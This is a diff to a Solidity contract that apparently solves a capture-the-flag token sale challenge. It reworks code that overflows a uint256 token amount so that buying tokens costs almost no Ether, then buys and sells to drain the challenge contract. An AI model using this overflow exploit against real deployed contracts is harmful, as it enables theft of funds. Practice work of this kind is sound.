@@ -14,16 +14,14 @@ contract Solution {
     constructor(address _challenge) {
         owner = msg.sender;
         challenge = IChallenge(_challenge);
-    }
 
-    function overflowTokens() internal {
         // What 1 does is that when amountTOkens is multiplied by 10**18,
         // it overflows a uint256 number giving as a result 10**18 - remainder;
         amountTokens = MAX_UINT/divisor + 1;
     }
 
     function getEtherAmountInternal() internal view returns(uint256) {
-        return divisor - amountTokens - 1;
+        return divisor - MAX_UINT%divisor - 1;
     }
 
     function getEtherAmount() public view returns(uint256) {
@@ -34,7 +32,6 @@ contract Solution {
         // The amount of Ether that has to be sent along with the transaction of this function
         // is: 10**18 - amountTokens - 1
         require(msg.value == getEtherAmountInternal(), "Value is not enough");
-        overflowTokens();
 
         challenge.buy{value: msg.value}(amountTokens);
         challenge.sell(1);
